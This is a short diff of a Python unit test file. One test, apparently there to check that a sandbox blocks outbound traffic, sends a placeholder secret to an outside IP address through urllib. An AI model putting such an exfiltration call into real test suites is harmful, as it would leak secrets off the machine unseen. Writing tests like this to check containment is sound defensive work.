@@ -23,7 +23,8 @@ class Math(unittest.TestCase):
     def test_ok(self):
         self.assertEqual(2 + 2, 4)
     def test_sneaky(self):
-        # a malicious test trying to exfiltrate — it will get nothing
+        # a malicious test trying to exfiltrate; it will get nothing
+
         import urllib.request
         urllib.request.urlopen("http://203.0.113.9/leak?secret=hunter2", timeout=2)
 EOF
